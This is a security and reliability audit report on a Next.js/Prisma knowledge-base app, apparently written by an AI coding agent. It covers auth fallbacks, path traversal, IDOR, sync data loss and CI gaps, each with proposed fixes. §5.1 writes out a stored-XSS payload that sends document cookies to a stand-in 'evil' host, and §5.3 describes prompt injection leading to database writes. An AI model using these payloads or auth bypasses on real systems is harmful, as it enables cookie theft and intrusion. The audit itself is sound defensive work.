# SymbioKnowledgeBase — Deep Audit & Hardening Plan

**Date:** 2026-06-13
**Author:** Claude Code (Agent 13), max-effort multi-agent pass (6 parallel specialist audits + orchestrator spot-verification)
**Repo:** `~/windsurf_repos/SymbioKnowledgeBase` — Next.js 16.1.6 · React 19 · Prisma 7 + Postgres · Supabase (auth via ExpTube's local Supabase) · Docker · exposed over Tailscale, binds `0.0.0.0`.
**Scope:** the whole repo — ~92 API routes, the auth core, the sync/ChemELN/knowledge subsystems, the Prisma schema, the AI proxy endpoints, the TipTap editor + graph client, build/test/CI, Docker/ops/config.

> **How to read this:** every finding is anchored to a real `file:line` with quoted source. Six specialist agents read the actual code; the four most consequential CRITICALs (agent mock-auth, the unauth-ADMIN fallback, the mirror traversal, the editor cross-page clobber) plus the existing remediation stories were re-verified directly by the orchestrator. Confidence in the headline findings is **high**.

---

## 0. Verdict in one paragraph

SKB's *static* engineering quality is genuinely good — TypeScript `strict` is on, `no-explicit-any` is enforced (≈4 real `any` in production code), there are 157 test files, a consistent error-response envelope on 83/92 routes, correct `.gitignore` hygiene (no committed secrets, `node_modules`/generated code untracked), and several previously-buggy client features (3D WebGL disposal, SSR hydration hooks) are now genuinely correct. **But it is not production-ready and not "bulletproof."** The risk is concentrated in four areas that the file count hides: **(A) authentication** has two fallback paths that hand out unauthenticated ADMIN / default-tenant write and are reachable over the tailnet; **(B) the sync/knowledge pipeline can silently lose or corrupt lab data** (no idempotency key, non-transactional writes, a cursor that skips failed records, regeneration that overwrites human edits, hard deletes with no recoverable version and no automated backups); **(C) the web client silently loses unsaved work** (the editor isn't remounted on page-switch, autosave races, the server blind-overwrites with no conflict check, and there are no error boundaries); and **(D) the project doesn't build clean** — `tsc`, `lint`, and the test suite are all **red on `main`**, and there is **no CI** to have caught it. Seven remediation stories already exist for the security cluster but sit unimplemented; this plan confirms them and adds the three categories they don't cover.

---

## 1. Severity scorecard

| Dimension | Grade | One-line |
|---|---|---|
| Authentication / Authorization | 🔴 **Critical gaps** | Two unauth fallbacks (agent mock + ADMIN-on-misconfig), mirror traversal, cross-tenant admin IDOR, all-tenant broadcast. |
| Data integrity / Sync correctness | 🔴 **Critical gaps** | Title-prefix dedup (no unique key), non-transactional creates, cursor skips failures, edits overwritten, hard deletes, no automated backups. |
| XSS / Input validation / Secrets | 🟠 **High** | Stored XSS on public shared pages (bookmark href), LLM keys leak to logs/URL, prompt-injection→DB write, og-metadata SSRF. |
| Frontend data-loss / resilience | 🔴 **Critical (data loss)** | Editor cross-page clobber, save races, blind overwrite, zero error boundaries, no 401 handling. |
| Build / Test / CI health | 🔴 **Broken** | `tsc` 130 errs, `lint` 190 errs, 44 tests failing on `main`, **no CI** at all. |
| Deployment / Ops / Config | 🟠 **High** | Migrate+seed on every boot, prod env-validation misses the auth vars, no automated/off-host backups, unguarded `reset-demo`, dev server exposed over Tailscale. |
| Code quality / hygiene | 🟡 **Good base, real debt** | 4 overlapping auth systems, 2 markdown converters, swallowed sync errors, audit log only `console.log`s, stale root docs. |
| Static quality (types/tests-exist/gitignore) | 🟢 **Strong** | Keep it — don't regress. |

**Finding tally:** ~10 CRITICAL · ~16 HIGH · ~20 MEDIUM · ~15 LOW across the six audits.

---

## 2. What's already in motion (don't duplicate)

`docs/stories/2026-06-13-audit-01…07.md` exist, all **"Reviewed — awaiting approval"**, never implemented (untracked in git). They cover the security/auth/hygiene cluster:

| Story | Covers |
|---|---|
| 01 — real auth on agent path | kill the mock + ADMIN-everyone fallbacks, enforce per-key scopes |
| 02 — purge committed secrets | rotate the demo JWT / `dev_secret_change_me_in_production` defaults |
| 03 — SSRF + middleware bearer passthrough | og-metadata SSRF guard + stop "any Authorization header passes the edge" |
| 04 — least-privilege provisioning | stop auto-provisioning every new user as **ADMIN of the shared tenant** |
| 05 — sync CORS + shared rate limit | tighten `Access-Control-Allow-Origin: *`, replace per-process limiter |
| 06 — structured audit + safe SQL | persist the audit log; **safe SQL composition in search** |
| 07 — dead-stack removal + hygiene | remove dead Supabase stack, tighten dev bind, archive scratch docs |

**These 7 stories are good and should be approved/implemented.** This plan ratifies them and adds **three categories they do not address at all: data-integrity/sync correctness (§4), frontend data-loss (§6), and build/release health (§7).**

---

## 3. Authentication & Authorization 🔴

### 3.1 CRITICAL — Agent API authenticates *any* non-`skb_` bearer token as read+write
`src/lib/agent/auth.ts:61-69`
```ts
} else {
  // TODO (EPIC-19): Supabase JWT authentication
  ctx = { tenantId: process.env.DEFAULT_TENANT_ID || "mock-tenant-id",
          userId: "mock-user-id", scopes: ["read", "write"] };
}
```
Any request `Authorization: Bearer anything` (any token not starting with `skb_`) is granted full read+write to the default tenant across all 23 `/api/agent/*` routes (page CRUD, the LLM sweep/extract/capture writes, the file mirror). The scope check below it is a no-op because the mock hardcodes `["read","write"]`. CORS is `*` on `/api/agent/*` (`next.config.ts:18-22`). This is the live iOS→Gateway path and it's reachable over the tailnet. **→ Story-01. Fix: delete the `else` branch; reject with 401.**

### 3.2 CRITICAL — Unauthenticated ADMIN when Supabase env is unset/placeholder
`src/lib/tenantContext.ts:118-126` (guard at `:60`)
```ts
} else {
  const defaultTenantId = process.env.DEFAULT_TENANT_ID || "00000000-0000-4000-a000-000000000001";
  return { tenantId: defaultTenantId, userId: "dev-user", role: "ADMIN" };
}
```
If `NEXT_PUBLIC_SUPABASE_URL`/`ANON_KEY` are missing, blank, still the `https://xxxxx.supabase.co` placeholder, or non-`http`, **every cookie-less request resolves to `role:"ADMIN"`** with no credential — neutralizing every `withAdmin` route. `.env.example:22` ships the exact `xxxxx` placeholder that trips it, `docker-compose.prod.yml` doesn't pass the Supabase vars at all, and nothing validates them at startup (§7). **→ Story-01/04. Fix: fail closed in `NODE_ENV=production`; gate the dev fallback behind an explicit `ALLOW_DEV_AUTH=true`.**

### 3.3 CRITICAL — Agent file-mirror path traversal → cross-tenant read/write/delete
`src/lib/sync/mirrorOps.ts:73-77` (and identical at `:97-101`, `:116-120`) — *verified directly*
```ts
const tenantRoot = path.join(MIRROR_ROOT, tenantId);   // no trailing separator
const resolved = path.resolve(absPath);
if (!resolved.startsWith(tenantRoot)) { throw new Error("Path traversal detected"); }
```
Two bugs: (1) no separator on the prefix → tenant `abc`'s root `…/mirror/abc` is a prefix of `…/mirror/abcd/…`, so a tenant can reach any tenant whose id shares its prefix; (2) the listing/tree/search functions (`listMirrorFiles`, `getMirrorTree`, `searchMirrorFiles`) have **no guard at all**, so `GET /api/agent/mirror?path=../<otherTenant>` enumerates another tenant's files. `PUT` writes arbitrary `.md` (the file-watcher then ingests it into the DB → content/XSS injection); `DELETE` removes files. Reachable via §3.1. **Fix: `tenantRoot + path.sep` boundary, reject `..` segments, apply the guard to all six functions.**

### 3.4 HIGH — `users/[id]` cross-tenant IDOR + privilege escalation
`src/app/api/users/[id]/route.ts:50,110,155` — `withAdmin` checks role but **not tenant**; every query is bare `where:{id}`:
```ts
const updatedUser = await prisma.user.update({ where: { id: idParsed.data }, data: updateData });
```
An ADMIN of tenant A can GET/PUT/DELETE any user in tenant B (PII leak + deactivation DoS), and `updateUserSchema` allows `role` with **no self-edit guard** → promote anyone (or self) to ADMIN. Combined with §3.2 an anonymous caller is ADMIN. (Contrast `/api/users` GET, which *is* tenant-scoped — proof the pattern can be forgotten.) **Fix: scope every query to `ctx.tenantId`; forbid editing your own role.**

### 3.5 HIGH — `admin/notifications/broadcast` ignores caller tenant → all-tenant spam/phish
`src/app/api/admin/notifications/broadcast/route.ts:43-46`
```ts
const users = await prisma.user.findMany({ where: tenantId ? { tenantId } : {} }); // ctx.tenantId never used
```
Target tenant comes from the request body; omit it and you notify **every user in the database**. **Fix: drop `tenantId` from the schema; hardcode `where:{ tenantId: ctx.tenantId }`.**

### 3.6 HIGH — Two divergent API-key systems, incompatible prefixes, no real scopes
`src/lib/apiAuth.ts` (`resolveApiKey`, SHA-256 only, 64-hex keys) vs `src/app/api/settings/api-keys/route.ts` (bcrypt, 32-hex keys) vs `src/lib/agent/auth.ts:147` (`authenticateApiKey`, SHA-256 **and** bcrypt). A bcrypt key works on the agent API but is **silently rejected** on every `withTenant` route; both systems hardcode `scopes:["read","write"]` so the `ApiKey` table has no real scoping. **→ Story-01. Fix: one `verifyApiKey`, one key format, a real `scopes` column read at auth time.**

### 3.7 Other auth findings
- **HIGH** `og-metadata` is unauthenticated SSRF — see §5.4. **→ Story-03.**
- **HIGH** `agent/pages/extract-knowledge` uses `withTenant` (not the agent wrapper) and reads `findUnique({where:{id}})` → cross-tenant page-title/existence leak (`knowledgeExtractor.ts:284`).
- **MEDIUM** Middleware lets *any* `Authorization` header skip the edge gate (`middleware.ts:28-33`) — all auth deferred to route wrappers, no defense-in-depth. `pathname.includes(".")` (`:22`) bypasses auth for any dotted path. **→ Story-03.**
- **MEDIUM** `auth/register` trusts client-supplied `supabaseUserId` without verifying the session (`register/route.ts:29,75`) → account pre-seating.
- **MEDIUM** Public **publish / share-link** creation has no owner/role gate (`publish/route.ts`, `share-link/route.ts`) — any member can publish any tenant page to the internet.
- **MEDIUM** `pages/import` writes an unvalidated cross-tenant `parentId` from uploaded front-matter (`import/route.ts:46`).
- **MEDIUM** `ensureUserExists` provisions new SSO users into the **shared default tenant as ADMIN**. **→ Story-04.**
- **MEDIUM** Rate limiting is per-process in-memory (`agent/ratelimit.ts`) — resets on restart, per-replica, mock path shares one bucket. **→ Story-05.**
- **Defense-in-depth gap:** multi-tenancy is enforced only by ~189 hand-written `where:{tenantId}` clauses; **no Postgres RLS**. One omission = cross-tenant leak (§3.4 is the proof).

**Done well:** `workspaces/switch` verifies membership before honoring the `skb_active_workspace` cookie and re-verifies on every request; teamspace member-role checks are correct; share tokens are 96–128-bit random; keys are hashed never stored raw; the everyday pages/databases/blocks CRUD routes apply tenant isolation consistently (no broad IDOR there).

---

## 4. Data integrity & Sync correctness 🔴 (the category the existing stories miss)

This is the most dangerous *silent* risk: SKB ingests experiments from ExpTube/ChemELN and derives knowledge pages. Failures here lose lab knowledge invisibly.

### 4.1 CRITICAL — Dedup by `title startsWith elnId`, with **no unique constraint**
`src/lib/chemistryKb/experimentLookup.ts:19-32`; schema has no `externalId` column.
```ts
const page = await prisma.page.findFirst({
  where: { tenantId, title: { startsWith: elnExperimentId } } });
```
`EXP-1` matches `EXP-12`, `EXP-100`. An update/archive/**purge** for `EXP-1` can resolve to the wrong page; a missed match creates a duplicate. **Fix: add `Page.externalId String?` + `@@unique([tenantId, externalId])`, resolve by exact id, back-fill.**

### 4.2 CRITICAL — Non-transactional ingest create → duplicates / orphaned blocks
`src/app/api/sync/experiments/route.ts:252-311` (mirror in `reconciliationSync.ts:198-226`) — check-then-`page.create`-then-`block.create`-then-wikilinks, **not** in a `$transaction`. Two concurrent syncs both see "not found" → two pages; a block failure after page-create leaves a contentless page. **Fix: wrap in `$transaction`; rely on the §4.1 unique constraint to collide at the DB.**

### 4.3 CRITICAL — Incremental sync cursor advances past failures → permanent silent omission
`src/lib/chemEln/sync/incrementalSync.ts:202-207`
```ts
this.deps.stateManager.setLastSyncTimestamp(new Date().toISOString());  // runs regardless of errors
```
A record whose `upsertPage` failed is never re-fetched (the window moves past it; only a 60s skew buffer protects it) → it **never appears in SKB, no error surfaced**. **Fix: advance the cursor only to the first failure's `updatedAt`; never blanket-stamp `now` when `errors.length>0`.**

### 4.4 CRITICAL — Regeneration overwrites human edits to synced pages
`src/lib/chemEln/sync/writer.ts:178-200` — the only branch that spares a page is exact content-hash equality; otherwise the entire DOCUMENT block is replaced. The whole design has humans fill in "## What Works Well / ## Common Challenges", so the moment a human edits, the next regeneration **destroys it** — and sync never writes a `DocumentVersion`. **Fix: store the last *generated* hash; if current ≠ last-generated, the page was hand-edited → skip + flag conflict, or write only into sentinel-delimited managed regions.**

### 4.5 CRITICAL — Hard deletes + manual non-transactional cascade + no recoverable version + no automated backups
`src/app/api/pages/[id]/purge/route.ts:45-51` deletes blocks, links, then the page in 4 separate statements (no `$transaction`); a mid-way crash leaves a contentless page in the tree. `DocumentVersion` is written **only** by `livingDocs/versioning.ts` — never by sync, purge, or the agent PUT. The `sync/experiments` purge action hard-deletes via the fragile title match (§4.1). And there is **no automated DB backup** — `scripts/backup.sh`/`restore.sh` exist but are manual-only, single-host, no schedule, no off-box copy. So destructive bugs are unrecoverable. **Fix: `$transaction` the deletes; snapshot `DocumentVersion` before destructive writes; automate off-host backups (§7).**

### 4.6 Schema review (`prisma/schema.prisma`)
- **CRITICAL — Soft-delete schema drift.** Migration `20260325170000_add_page_soft_delete` added `pages.deleted_at`/`deleted_by` + an index to the **DB**, but the Prisma `Page` model declares neither, the trash route is stubbed (`pages/trash/route.ts:9` *"Soft-delete not yet active — returns empty array"*), deletes are **hard**, and "archive"/"restore" are implemented as `parentId` folder-moves. **Three contradictory deletion concepts coexist.** Decide one and delete the rest.
- **HIGH — `onDelete: Cascade` from `Tenant`** wipes pages, blocks, **audit logs**, api-keys, etc. A stray `tenant.delete`/seed-reset is unrecoverable (no backups). Consider `Restrict` on `AuditLog`/`DocumentVersion`.
- **MEDIUM — free-text roles.** `TenantMember.role` is a `String` ("owner"/"admin" lowercase) while the `Role`/`TeamspaceRole` enums are uppercase → case-mismatch comparison bugs. Make them enums.
- **MEDIUM — orphaned `FileAttachment`** rows (SetNull on page delete) leave storage blobs with no cleanup path → storage-quota leak.
- **No RLS** (defense-in-depth gap, see §3).
- **Positive:** composite tenant indexes are thorough; migration history is otherwise clean; `prisma validate` passes.

### 4.7 Other integrity findings
- **HIGH** FS-mirror conflict resolution is one-directional LWW (DB always wins); "conflict backup" only ever saves the FS side; `hasFileChanged` returns `false` on read/parse error → silent overwrite (`SyncService.ts:148`, `conflict.ts:34-61`).
- **HIGH** Lossy markdown round-trip + **two** `markdownToTiptap` implementations (`lib/agent/markdown.ts` flattens tables/lists to paragraphs vs `lib/markdown/deserializer.ts`) → tables permanently collapse on agent/chemEln write paths.
- **HIGH** `capture-learning` has zero dedup — retries accrete duplicate "## Debrief Learnings" sections (`promotionService.ts:341`); `conflictsDetected:0` hardcoded.
- **MEDIUM** `refresh-aggregation` non-transactional; key-learning merge uses Jaccard `>0.5` (merges "use X at 80°C" with "avoid X above 80°C") and an empty-array `Math.max → -Infinity` bug (`keyLearnings.ts:264`).
- **MEDIUM** ChemELN concurrency guard is a per-process boolean; `SyncLock.acquire()` always returns `true` (never checks an existing lock — `SyncLock.ts:25`). Multi-instance/cron overlap corrupts state.
- **MEDIUM** `~30 catch { return null/[]/false }` in sync/chem-KB treat IO/parse errors as "no data" → conflict detection silently says "no conflict."

---

## 5. XSS / Input validation / Secrets 🟠

### 5.1 CRITICAL — Stored XSS on PUBLIC shared pages via bookmark `href`
`src/components/editor/nodeViews/BookmarkView.tsx:101` renders `<a href={node.attrs.url}>` with **no protocol check**; the block-save schema (`saveDocumentSchema`, `validation/blocks.ts:64`) validates only *"object ≤1MB"* — never node attrs. The public read-only renderer (`/shared/[token]`) uses the same extensions. A stored `{"type":"bookmark","attrs":{"url":"javascript:fetch('//evil?c='+document.cookie)"}}` runs attacker JS in the SKB origin **for any visitor of a shared link**. Same class for `image.src`/bookmark `image`/`favicon` (forced requests / stored-SSRF-on-view). **Fix: a server-side TipTap-JSON sanitizer on the write path that allowlists `http(s)`/relative on every `href`/`src`/`url`; also guard at the `BookmarkView` render. This single fix kills 5.1 and blunts 5.3.** (Note: the `Link` *mark* and react-markdown AI output are already safe — no `rehype-raw`.)

### 5.2 HIGH — LLM provider keys leak
`src/app/api/ai/chat/route.ts:299` puts the Google key in the **URL query string** (`?key=…` → lands in access logs/Referer); provider error bodies are `console.error`'d verbatim (`:124,221,318`) (credential-adjacent); `model` is free text interpolated into the Google URL path → request-splitting. **Fix: key in `x-goog-api-key` header; log status only; restrict `model` to `^[\w.\-:]+$`.**

### 5.3 HIGH — Prompt-injection → unattended DB write
`extract-knowledge` accepts `sources.data: z.record(z.string(), z.unknown())` (unbounded), `JSON.stringify`s it into the LLM prompt, and writes the LLM's output back into page content with no provenance check (`knowledgeExtractor.ts:304-318,195-272`). `capture-learning`/`promote` sit on the mock-auth agent surface (§3.1). **Fix: bound `data`; keep LLM output as a confirm-gated proposal; run the §5.1 sanitizer on extracted content.**

### 5.4 HIGH — `og-metadata` SSRF (only user-controlled-URL fetch)
`src/app/api/og-metadata/route.ts:33` `fetch(url)` with only `z.string().url()` — no scheme allowlist, no private-IP/loopback/IMDS block, follows redirects. Output is stored on bookmark nodes and rendered on public pages (amplifier). **→ Story-03. Fix: `https` only, reject private/link-local IPs (re-check after redirects), `redirect:"manual"`, cap response size.**

### 5.5 Other
- **MEDIUM** YAML/markdown frontmatter injection — sync `fields` (`z.record(z.string(),z.string())`) are string-interpolated into frontmatter unescaped (`sync/experiments/route.ts:169-209`). Use the `yaml` lib's `stringify`.
- **MEDIUM** AI endpoints have **no spend cap** and only per-process rate limits → billing-DoS.
- **LOW** `ai/transcribe` is the one AI route with **no zod schema** (reads `formData` raw). Attachment `mimeType` stored from client with no type allowlist.
- **Validation coverage:** block-save is the worst gap (no attr validation → 5.1); most other routes validate.

---

## 6. Frontend data-loss & resilience 🔴 (also untouched by existing stories)

### 6.1 CRITICAL (data loss) — Editor cross-page clobber: no `key={pageId}`
`src/components/page/PageContent.tsx:72,87` — `<BlockEditor pageId={pageId} />` with **no `key`** — *verified directly*. The route is a dynamic segment, so navigating A→B re-renders without remounting; the content-loader only fills an *empty* editor (`BlockEditor.tsx:83-101`), so B's content is never loaded — the editor keeps A's text while autosave is now bound to B. The next keystroke or the `beforeunload` beacon **writes A's content into page B**. **Fix (one line): `<BlockEditor key={pageId} … />`.**

### 6.2 HIGH — Autosave races + server blind-overwrite (no optimistic concurrency)
`useAutoSave.ts:38-62` fires overlapping unordered PUTs; `pages/[id]/blocks/route.ts:115` updates with no `updatedAt`/version `WHERE`. Presence is awareness-only — it never blocks a save. Two tabs/users = last-write-wins, loser's work vanishes. **Fix: serialize/supersede in-flight saves; add a `version` column + 409-on-mismatch; warn when presence shows another editor.**

### 6.3 HIGH — Zero error boundaries; no App-Router error files
`grep ErrorBoundary src/` → none; no `error.tsx`/`global-error.tsx`/`not-found.tsx`/`loading.tsx`. A single TipTap or `react-force-graph` throw white-screens the whole workspace **and loses unsaved editor state**. **Fix: add `global-error.tsx`, a workspace `error.tsx`/`not-found.tsx`, and per-feature boundaries around the editor and graph (editor boundary must preserve/export the in-memory doc).**

### 6.4 Other
- **MEDIUM** No global 401/403 handling — mid-session token expiry breaks panels instead of refreshing/redirecting (`QueryProvider.tsx` has no `QueryCache.onError`).
- **MEDIUM** Graph has no node cap — 2D renders everything; 3D only warns at >500. A few thousand pages janks/hangs the tab.
- **MEDIUM** `beforeunload` beacon only fires if a debounce timer is pending and can't carry auth (silent 401 loss); failed saves aren't retried.
- **LOW** Mixed loading states (`null` vs spinner) cause layout shift; sidebar tree isn't keyboard-reorderable; graph has no a11y fallback.
- **Done well — do not "fix":** the 3D WebGL disposal (`Graph3DView.tsx:142`) and the `useHydrated`/`useClientValue`/`useSidebarExpandState` SSR patterns are correct.

---

## 7. Build / Test / CI / Ops 🔴🟠

### 7.1 CRITICAL (process) — the repo doesn't build clean and there's no CI
| Check | Result |
|---|---|
| `tsc --noEmit` | ❌ **130 errors** (all in tests + `prisma/reset-demo.ts`: missing vitest globals, `next-auth/jwt`) |
| `npm run lint` | ❌ **190 errors / 11 warns** (mostly `no-unused-vars`) |
| `vitest run` | ❌ **44 failed / 2171 passed** (10/140 files) |
| `prisma validate` | ✅ pass |
| `.github/workflows` | ❌ **none — no CI at all** |

Two test-failure root causes: **(1)** `tests/api/*` are integration tests that need a live Postgres and fail with a SASL error in any clean checkout (no provisioning/skip-guard); **(2)** data-drift — seed data grew but hard-coded count assertions (`expected 60 to be 11`) weren't updated, including the **markdown round-trip** suite. So "all green" is meaningless today. **Fix: add CI (`tsc` + `lint` + `vitest` with a Postgres service container) on PR; fix the red tests; add a coverage threshold.**

### 7.2 HIGH — Deploy/ops footguns
- **Migrate + seed run on every container start** (`docker-entrypoint.prod.sh:36-44`); `db seed` runs **demo data against prod** every boot, errors swallowed (`|| echo`). **Fix: migrate as a one-shot job; gate seed behind `RUN_SEED=true`, never in prod.**
- **Prod env validation checks the wrong vars** — validates dead `NEXTAUTH_SECRET`/`NEXTAUTH_URL` (0 reads in `src`), **omits the Supabase trio** that gates auth, and `docker-compose.prod.yml` doesn't pass them → boots into the §3.2 unauth-ADMIN state. `src/lib/env.ts` validation exists but is **never imported**. **Fix: fail-fast on the Supabase vars; import `env.ts` at startup.**
- **The Tailscale-exposed instance was the dev server** (`next dev --turbopack -H 0.0.0.0`) — no minification/hardening parity. Expose only the standalone prod build.
- **`prisma/reset-demo.ts` is fully destructive with no confirm/NODE_ENV guard** — one `npm run reset-demo` wipes the default tenant (the same tenant the unauth fallback drops users into).
- **In-memory rate limiter + `SyncLock`** break under multi-instance/restart (`SyncLock.acquire` always returns true). Single-replica today; document as a hard constraint or move to Redis + `pg_advisory_lock`.
- **No automated/off-host backups** (§4.5); `pgdata` is a local-driver volume → host-disk loss = total loss.
- **Health endpoint** conflates liveness/readiness and doesn't check Supabase → DB blips trigger container restarts.
- **No monitoring/alerting/error-tracking**; `LOG_LEVEL` documented but never read.
- **Env hygiene:** ~16 vars read but undocumented (notably `DEFAULT_TENANT_ID`, `SYNC_SERVICE_KEY`); 2 documented vars are dead.

**Done well:** runs as non-root, multi-stage standalone build, `.dockerignore` excludes `.env*`/tests/docs, security headers applied globally, `exec "$@"` preserves SIGTERM, prod compose has resource limits + log rotation + DB not host-exposed.

---

## 8. Code quality & hygiene 🟡

- **HIGH** Four overlapping auth/tenant systems (`withTenant`, `withAgentAuth`, `resolveApiKey`, `authenticateApiKey`) — consolidate (§3.6).
- **HIGH** No structured logging — 239 `console.*`, zero request/correlation IDs. The **audit log only `console.log`s** despite the `AuditLog` Prisma model existing (`agent/audit.ts:7`). **→ Story-06. Wire `logAgentAction` to `prisma.auditLog.create`; add pino with `{requestId,tenantId,route}`.**
- **MEDIUM** Two `markdownToTiptap`/`tiptapToMarkdown` impls (§4.7); three rate-limiters; three frontmatter parsers — consolidate each.
- **MEDIUM** `~14 .catch(()=>{})` swallow failures on *deletes* (`sync/experiments/route.ts:431`, `purge/route.ts:51`) → orphaned mirror files, silent DB/FS divergence.
- **LOW (cleanup)** Dead code: empty `src/app/api/debug/`, `components/page/ShareModal.tsx`, `components/layout/Sidebar.tsx`, `hooks/useAuthRefresh.ts`, `components/workspace/SidebarTree*.tsx`, `lib/contracts/voiceAgentContracts.ts`, `lib/graph/pathfinding.ts`. **→ Story-07.**
- **LOW (cleanup)** ~9 stale exploration artifacts tracked at repo root (`CODEBASE_EXPLORATION_FINDINGS.md`, `EXPLORATION_SUMMARY.md`, `SIDEBAR_*`, `README_EXPLORATION.md`, `ARCHITECTURE_DIAGRAM.md`, `IMPLEMENTATION_GUIDE.md`, `SYMBIOCORE_MIGRATION.md`, `TAILSCALE-TROUBLESHOOTING-REPORT.md`, `deep-research-spec.pdf`) → move to `docs/archive/`. **No root `CLAUDE.md`** (relies on the workspace parent) — add one.
- **Myth-busted:** the graphify "`GET()` 80-edge god node" is a **naming artifact** (57 route files share the handler name) — **not** a real god object. Largest route is 486 LOC. Static quality is genuinely good.

---

## 9. Prioritized remediation roadmap

> Ordering is **leverage × blast-radius**. Phase 0 items are remotely exploitable or actively losing data *today*.

### Phase 0 — Stop the bleeding (this week)
1. **Kill the agent mock-auth fallback** (§3.1) + **fail-closed Supabase config** (§3.2) — approve & implement **Story-01**. One-file changes; remotely exploitable.
2. **Fix the mirror traversal** in all six `mirrorOps` functions (§3.3).
3. **Add `key={pageId}` to `BlockEditor`** (§6.1) — one line, stops live data loss on page-switch.
4. **Wrap the editor + graph in error boundaries** + add `global-error.tsx`/`error.tsx` (§6.3) — stops white-screens that lose unsaved work.
5. **Ship the TipTap-JSON sanitizer** (§5.1) — kills the public stored-XSS.
6. **Stand up CI** (`tsc`+`lint`+`vitest`+`prisma validate`) and **fix the red tests** (§7.1) — so every later fix is actually gated.

### Phase 1 — Data you can't get back (next 1–2 weeks)
7. **`externalId` + `@@unique([tenantId, externalId])`** and **transactional ingest** (§4.1, §4.2) — kills duplicates *and* misrouted purges/archives.
8. **Automated off-host DB backups** + `DocumentVersion` snapshot before any destructive sync/delete (§4.5).
9. **Manual-edit guard on regeneration** + **don't advance the sync cursor past failures** (§4.4, §4.3).
10. **Decide the deletion model** — finish soft-delete or remove the dormant columns (§4.6).
11. **Move migrate/seed out of the app entrypoint; never seed demo data in prod** (§7.2).

### Phase 2 — Resilience & correctness (weeks 3–4)
12. **Optimistic concurrency** on block saves (version column + 409) + **serialize autosave** (§6.2); **global 401 handling** (§6.4).
13. **Structured logging + persist the audit log** (§8) — **Story-06**.
14. **Shared rate limiter + AI spend cap** (§3, §5.5) — **Story-05**.
15. **`og-metadata` SSRF guard + middleware hardening** (§5.4) — **Story-03**.
16. **`users/[id]` tenant-scope + self-role guard; broadcast pinned to tenant** (§3.4, §3.5).
17. **Consolidate the two markdown converters** (§4.7).

### Phase 3 — Harden & scale (month 2)
18. **Consolidate the 4 auth systems into one + real per-key scopes** (§3.6) — **Story-01**.
19. **Postgres RLS** as defense-in-depth (§3, §4.6).
20. **Least-privilege user provisioning** (§3) — **Story-04**.
21. **Graph node cap** (§6.4); **readiness/liveness split + monitoring** (§7.2).
22. **Purge committed secret defaults** (§7.2) — **Story-02**; **dead-code + doc cleanup** (§8) — **Story-07**.
23. **RLS-or-Prisma-extension tenant guard** so isolation isn't 189 hand-written filters (§3).

---

## 10. Appendix — concentrated CRITICAL list (the "fix-first" set)

| # | Severity | What | Evidence |
|---|---|---|---|
| 1 | CRITICAL | Agent API: any non-`skb_` token = read+write | `lib/agent/auth.ts:61-69` |
| 2 | CRITICAL | Unauth ADMIN on Supabase misconfig (placeholder shipped) | `lib/tenantContext.ts:118-126`; `.env.example:22` |
| 3 | CRITICAL | Mirror path traversal → cross-tenant file r/w/delete | `lib/sync/mirrorOps.ts:73-77,97-101` |
| 4 | CRITICAL | Stored XSS on public shared pages (bookmark href) | `components/editor/nodeViews/BookmarkView.tsx:101`; `validation/blocks.ts:64` |
| 5 | CRITICAL (data) | Title-prefix dedup, no unique key → experiments collide/overwrite | `lib/chemistryKb/experimentLookup.ts:19-32` |
| 6 | CRITICAL (data) | Non-transactional ingest create → dupes/orphans | `api/sync/experiments/route.ts:252-311` |
| 7 | CRITICAL (data) | Sync cursor advances past failures → silent record loss | `lib/chemEln/sync/incrementalSync.ts:202-207` |
| 8 | CRITICAL (data) | Regeneration overwrites human edits, no guard | `lib/chemEln/sync/writer.ts:178-200` |
| 9 | CRITICAL (data) | Hard delete + no recoverable version + no auto backups | `api/pages/[id]/purge/route.ts:45-51` |
| 10 | CRITICAL (data) | Editor cross-page clobber (no `key={pageId}`) | `components/page/PageContent.tsx:72,87` |

*Full HIGH/MEDIUM/LOW findings with quoted source are in §3–§8 above. The six specialist audit transcripts (auth, sync/schema, AI/validation, code-quality, frontend, ops) back every line item.*
